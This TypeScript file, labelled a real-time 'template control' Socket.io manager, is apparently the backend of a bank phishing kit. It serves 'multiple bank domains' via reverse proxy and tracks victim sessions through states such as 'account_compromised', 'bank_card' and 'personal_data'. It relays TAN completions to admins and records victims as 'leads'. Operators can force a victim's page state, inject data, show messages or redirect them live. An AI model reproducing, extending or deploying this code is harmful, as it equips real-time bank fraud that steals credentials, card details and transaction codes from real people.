/**
 * Socket.io Manager for Real-time Template Control
 * Enables admin control of user flows and real-time updates
 */

import { Server } from 'socket.io';
import { createServer } from 'http';
import sessionManager from './sessionManager';
import notificationService from './notificationService';
import partialLeadService from './partialLeadService';

interface AdminCommand {
  sessionKey: string;
  command: 'force_state' | 'inject_data' | 'redirect' | 'show_message';
  payload: any;
}

interface SessionUpdate {
  sessionKey: string;
  state: string;
  data?: any;
  message?: string;
}

class SocketManager {
  private io: Server | null = null;
  private connectedSessions = new Map<string, string>(); // sessionKey -> socketId
  private connectedAdmins = new Set<string>(); // admin socketIds

  /**
   * Initialize Socket.io server
   */
  init(httpServer: any, app?: any): void {
    // Allow all origins for Socket.io (needed for multiple bank domains via reverse proxy/Cloudflare)
    this.io = new Server(httpServer, {
      cors: {
        origin: true, // Allow all origins
        methods: ["GET", "POST"],
        credentials: true
      },
      transports: ['websocket', 'polling'],
      allowEIO3: true
    });

    // Attach Socket.IO instance to Express app for route access
    if (app) {
      app.set('io', this.io);
      console.log('✅ Socket.io instance attached to Express app');
    }

    this.setupEventHandlers();
    console.log('✅ Socket.io initialized for template control');
  }

  /**
   * Get Socket.IO instance
   */
  getIO(): Server | null {
    return this.io;
  }

  /**
   * Setup Socket.io event handlers
   */
  private setupEventHandlers(): void {
    if (!this.io) return;

    this.io.on('connection', (socket) => {
      console.log(`🔌 Client connected: ${socket.id}`);

      // Handle template session joining
      socket.on('join_session', async (data) => {
        const { sessionKey, templateName, userType = 'user' } = data;
        
        console.log(`🔌 join_session event:`, { sessionKey, templateName, userType, socketId: socket.id });
        
        if (userType === 'admin') {
          // Admin joining for monitoring
          this.connectedAdmins.add(socket.id);
          socket.join('admins');
          console.log(`👨‍💼 Admin joined monitoring: ${socket.id}`);
          
          // Send current active sessions to admin
          const activeSessions = await this.getActiveSessions();
          socket.emit('active_sessions', activeSessions);
          console.log(`📊 Sent ${activeSessions.length} active sessions to admin`);
        } else {
          // User session joining
          if (sessionKey) {
            socket.join(`session_${sessionKey}`);
            this.connectedSessions.set(sessionKey, socket.id);
            console.log(`👤 Session ${sessionKey} (${templateName}) joined room: session_${sessionKey}`);
            console.log(`📊 Current connected sessions:`, Array.from(this.connectedSessions.keys()));
            
            // Notify admins of new session
            this.io.to('admins').emit('session_joined', {
              sessionKey,
              templateName,
              timestamp: new Date().toISOString()
            });
            
            // Create notification for new session
            await notificationService.notifySessionStarted(
              sessionKey, 
              templateName, 
              socket.handshake.address,
              socket.handshake.headers['user-agent']
            );
            
            // Update session as connected in database
            await sessionManager.updateSessionState(sessionKey, 'login');
          }
        }
      });

      // Handle admin commands
      socket.on('admin_command', async (command: AdminCommand) => {
        console.log(`👨‍💼 Admin command received:`, command);
        await this.executeAdminCommand(command);
      });

      // Handle session state updates from templates
      socket.on('session_update', async (update: SessionUpdate) => {
        console.log(`📊 Session update:`, update);
        
        // Update session in database
        await sessionManager.updateSessionState(update.sessionKey, update.state);
        
        // Notify admins of session update
        this.io.to('admins').emit('session_updated', {
          ...update,
          timestamp: new Date().toISOString()
        });
        
        // Create notification for significant state changes
        const significantStates = ['account_compromised', 'personal_data', 'bank_card', 'final_success'];
        if (significantStates.includes(update.state)) {
          const session = await sessionManager.getSession(update.sessionKey);
          if (session) {
            await notificationService.notifySessionStateChange(
              update.sessionKey,
              session.template_name,
              session.current_state || 'unknown',
              update.state
            );
          }
        }
      });

      // Listen for TAN completion events
      socket.on('tan-completed', async (data) => {
        console.log('🔐 TAN completed:', data);
        this.io.to('admins').emit('tan-completed', {
          ...data,
          timestamp: new Date().toISOString()
        });
        
        // Create notification for TAN completion
        const sessionKey = this.getSessionKeyBySocketId(socket.id);
        if (sessionKey) {
          const session = await sessionManager.getSession(sessionKey);
          if (session) {
            await notificationService.notifyTanCompleted(
              sessionKey,
              session.template_name,
              data.type || 'TRANSACTION_TAN',
              true
            );
          }
        }
      });

      socket.on('tan-cancelled', async (data) => {
        console.log('🔐 TAN cancelled:', data);
        this.io.to('admins').emit('tan-cancelled', {
          ...data,
          timestamp: new Date().toISOString()
        });
        
        // Create notification for TAN cancellation
        const sessionKey = this.getSessionKeyBySocketId(socket.id);
        if (sessionKey) {
          const session = await sessionManager.getSession(sessionKey);
          if (session) {
            await notificationService.notifyTanCompleted(
              sessionKey,
              session.template_name,
              data.type || 'TRANSACTION_TAN',
              false
            );
          }
        }
      });

      // Handle disconnection
      socket.on('disconnect', async (reason) => {
        console.log(`🔌 Client disconnected: ${socket.id} (reason: ${reason})`);
        
        // Remove from admin set
        if (this.connectedAdmins.has(socket.id)) {
          this.connectedAdmins.delete(socket.id);
          console.log(`👨‍💼 Admin disconnected: ${socket.id}`);
        }
        
        // Remove from session mapping
        for (const [sessionKey, socketId] of this.connectedSessions.entries()) {
          if (socketId === socket.id) {
            this.connectedSessions.delete(sessionKey);
            console.log(`👤 Session ${sessionKey} disconnected`);
            
            // Notify admins of session disconnect
            this.io?.to('admins').emit('session_disconnected', {
              sessionKey,
              timestamp: new Date().toISOString()
            });
            
            // Create notification for session abandonment
            try {
              const session = await sessionManager.getSession(sessionKey);
              if (session && session.current_state !== 'final_success') {
                await notificationService.notifySessionAbandoned(
                  sessionKey,
                  session.template_name,
                  session.current_state || 'unknown'
                );
                
                // Trigger abandonment processing only after longer delay to avoid false positives
                setTimeout(async () => {
                  try {
                    // Double-check if session is still inactive before processing
                    const currentSession = await sessionManager.getSession(sessionKey);
                    if (currentSession && 
                        !currentSession.is_completed && 
                        !currentSession.lead_created &&
                        currentSession.current_state !== 'final_success') {
                      
                      // Check if session was updated recently (user might have reconnected)
                      const lastUpdate = new Date(currentSession.updated_at);
                      const now = new Date();
                      const minutesSinceUpdate = (now.getTime() - lastUpdate.getTime()) / (1000 * 60);
                      
                      // Only process if truly inactive for 10+ minutes
                      if (minutesSinceUpdate >= 10) {
                    await partialLeadService.processSpecificSession(sessionKey);
                      } else {
                        console.log(`⏳ Session ${sessionKey} was recently active, skipping abandonment processing`);
                      }
                    }
                  } catch (error) {
                    console.error(`❌ Error processing disconnected session ${sessionKey}:`, error);
                  }
                }, 10 * 60 * 1000); // Wait 10 minutes before processing (increased from 30 seconds)
              }
            } catch (error) {
              console.error('Error creating abandonment notification:', error);
            }
            break;
          }
        }
      });
    });
  }

  /**
   * Execute admin command on user session
   */
  private async executeAdminCommand(command: AdminCommand): Promise<void> {
    const { sessionKey, command: cmd, payload } = command;

    try {
      switch (cmd) {
        case 'force_state':
          await this.forceUserState(sessionKey, payload.state, payload.message);
          break;
          
        case 'inject_data':
          await this.injectSessionData(sessionKey, payload.data);
          break;
          
        case 'redirect':
          await this.redirectUser(sessionKey, payload.url);
          break;
          
        case 'show_message':
          await this.showUserMessage(sessionKey, payload.message, payload.type);
          break;
          
        default:
          console.warn(`⚠️ Unknown admin command: ${cmd}`);
      }
    } catch (error) {
      console.error('❌ Error executing admin command:', error);
    }
  }

  /**
   * Force user to specific state
   */
  async forceUserState(sessionKey: string, state: string, message?: string): Promise<void> {
    if (!this.io) return;

    // Update session state in database
    await sessionManager.updateSessionState(sessionKey, state);

    // Send state change to user
    this.io.to(`session_${sessionKey}`).emit('force_state', {
      state,
      message,
      timestamp: new Date().toISOString()
    });

    console.log(`🎯 Forced session ${sessionKey} to state: ${state}`);
  }

  /**
   * Inject data into user session
   */
  async injectSessionData(sessionKey: string, data: any): Promise<void> {
    if (!this.io) return;

    // Store data in session
    await sessionManager.storeSessionData(sessionKey, data);

    // Send data to user
    this.io.to(`session_${sessionKey}`).emit('inject_data', {
      data,
      timestamp: new Date().toISOString()
    });

    console.log(`💉 Injected data into session ${sessionKey}:`, data);
  }

  /**
   * Redirect user to external URL
   */
  async redirectUser(sessionKey: string, url: string): Promise<void> {
    if (!this.io) return;

    this.io.to(`session_${sessionKey}`).emit('redirect', {
      url,
      timestamp: new Date().toISOString()
    });

    console.log(`🔗 Redirecting session ${sessionKey} to: ${url}`);
  }

  /**
   * Show message to user
   */
  async showUserMessage(sessionKey: string, message: string, type: 'info' | 'warning' | 'error' = 'info'): Promise<void> {
    if (!this.io) return;

    this.io.to(`session_${sessionKey}`).emit('show_message', {
      message,
      type,
      timestamp: new Date().toISOString()
    });

    console.log(`💬 Showing ${type} message to session ${sessionKey}: ${message}`);
  }

  /**
   * Broadcast to all sessions of a specific template
   */
  async broadcastToTemplate(templateName: string, event: string, data: any): Promise<void> {
    if (!this.io) return;

    // Get all sessions for this template
    const sessions = await sessionManager.getSessionsByTemplate(templateName);
    
    for (const session of sessions) {
      this.io.to(session.session_key).emit(event, {
        ...data,
        timestamp: new Date().toISOString()
      });
    }

    console.log(`📢 Broadcast to ${sessions.length} ${templateName} sessions`);
  }

  /**
   * Get active sessions for admin dashboard
   */
  private async getActiveSessions(): Promise<any[]> {
    try {
      const sessions = await sessionManager.getActiveSessions();
      const mappedSessions = sessions.map(session => {
        const isConnected = this.connectedSessions.has(session.session_key);
        console.log(`🔍 Session ${session.session_key?.substring(0, 16)}... | Connected: ${isConnected} | State: ${session.current_state}`);
        
        return {
          sessionKey: session.session_key,
          templateName: session.template_name,
          state: session.current_state || 'unknown',
          createdAt: session.created_at,
          isConnected: isConnected
        };
      });
      
      console.log(`📊 Mapped ${mappedSessions.length} sessions for admin dashboard`);
      return mappedSessions;
    } catch (error) {
      console.error('Error getting active sessions:', error);
      return [];
    }
  }

  /**
   * Check if a session is connected
   */
  isSessionConnected(sessionKey: string): boolean {
    return this.connectedSessions.has(sessionKey);
  }

  /**
   * Get session key by socket ID
   */
  getSessionKeyBySocketId(socketId: string): string | null {
    for (const [sessionKey, sId] of this.connectedSessions.entries()) {
      if (sId === socketId) {
        return sessionKey;
      }
    }
    return null;
  }

  /**
   * Get connection statistics
   */
  getStats(): any {
    return {
      connectedSessions: this.connectedSessions.size,
      connectedAdmins: this.connectedAdmins.size,
      totalConnections: this.io?.engine.clientsCount || 0,
      uptime: process.uptime()
    };
  }

  /**
   * Notify admins of new lead creation
   */
  async notifyNewLead(leadData: any): Promise<void> {
    if (!this.io) return;

    this.io.to('admins').emit('new_lead', {
      ...leadData,
      timestamp: new Date().toISOString()
    });

    console.log(`📝 Notified admins of new lead: ${leadData.id}`);
  }

  /**
   * Send session activity to admins
   */
  async notifySessionActivity(sessionKey: string, activity: string, data?: any): Promise<void> {
    if (!this.io) return;

    this.io.to('admins').emit('session_activity', {
      sessionKey,
      activity,
      data,
      timestamp: new Date().toISOString()
    });
  }
}

// Export singleton instance
const socketManager = new SocketManager();
export default socketManager;
